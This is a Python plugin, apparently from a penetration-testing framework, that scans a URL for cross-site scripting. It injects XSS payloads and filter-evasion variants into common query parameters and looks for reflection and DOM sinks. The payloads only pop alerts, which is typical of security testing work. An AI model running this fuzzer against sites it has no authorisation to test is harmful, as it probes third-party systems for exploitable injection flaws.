"""
RedCortex Plugin: XSS Advanced Reflection and Fuzzing
"""

import logging
import html
import random
import re
import asyncio
import dataclasses
from typing import Any, Dict, List, Optional
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())

XSS_PARAMS = [
    "q", "search", "query", "term", "keyword",
    "page", "user", "name", "input", "message", "comment",
    "desc", "email", "id", "ref", "file", "txt", "news", "title", "url"
]
BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><svg onload=alert(2)>',
    "<img src=x onerror=alert(3)>",
    "</title><script>alert(4)</script>",
    "<iframe src=javascript:alert(5)>",
    "<svg onload=confirm(document.domain)>",
    "<details open ontoggle=alert(6)>",
]
TAMPERS = [
    lambda x: x,
    lambda x: html.escape(x),
    lambda x: x.replace("<", "%3c").replace(">", "%3e"),
    lambda x: ''.join(random.choice([ch.lower(), ch.upper()]) for ch in x),
]

DOM_SINKS = re.compile(
    r"(document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\(|Function\(|setTimeout\(|location\.|src\s*=|href\s*=|on[a-z]+\s*=)",
    re.I,
)

def _coerce_to_str(u) -> Optional[str]:
    if isinstance(u, str):
        return u
    try:
        candidate = getattr(u, "url", None)
        if isinstance(candidate, str):
            return candidate
    except Exception:
        pass
    try:
        s = str(u)
        if "://" in s or s.startswith("/") or s.startswith("http"):
            return s
    except Exception:
        pass
    return None

def _merge_url_params(url: str, key: str, value: str) -> str:
    sp = urlsplit(url)
    q = dict(parse_qsl(sp.query, keep_blank_values=True))
    q[key] = value
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(q, doseq=True), sp.fragment))

async def _scan_url(url: str) -> List[Dict[str, Any]]:
    import httpx
    results = []
    marker = "rc" + "".join(random.choices("abcdef1234567890", k=6))
    all_payloads = []
    for base in BASE_PAYLOADS:
        for tamper in TAMPERS:
            try:
                v = tamper(base.replace("alert(1)", f"alert('{marker}')"))
                all_payloads.append(v)
            except Exception:
                continue
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            for param in XSS_PARAMS:
                for payload in all_payloads:
                    target_url = _merge_url_params(url, param, payload)
                    try:
                        resp = await client.get(target_url)
                        text = resp.text or ""
                        csp_header = resp.headers.get("content-security-policy", "")
                        dom_sink = bool(DOM_SINKS.search(text))
                        # Reflected or DOM sink
                        if marker in text or payload in text or dom_sink:
                            evidence = []
                            if marker in text:
                                evidence.append(f"Marker '{marker}' reflected for '{param}'")
                            if payload in text:
                                evidence.append(f"Payload fragment reflected for '{param}'")
                            if dom_sink:
                                evidence.append("DOM sink detected")
                            results.append({
                                "target": url,
                                "param": param,
                                "payload": payload,
                                "vector": "reflected" if marker in text or payload in text else "dom",
                                "evidence": " | ".join(evidence),
                                "status": resp.status_code,
                                "csp": csp_header
                            })
                    except Exception as e:
                        logger.debug(f"Request failed for {target_url}: {e}")
    except Exception as ee:
        logger.error(f"Total scanning error: {ee}")
    return results

def run(session, url):
    url_str = _coerce_to_str(url) or _coerce_to_str(session)
    if not url_str:
        logger.warning("No valid target URL for scan: %s %s", session, url)
        return []
    try:
        # Run the async fuzzing routine
        try:
            findings = asyncio.run(_scan_url(url_str))
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            findings = loop.run_until_complete(_scan_url(url_str))
            loop.close()
        return findings
    except Exception as e:
        logger.exception("Plugin run failed: %s", e)
        return []
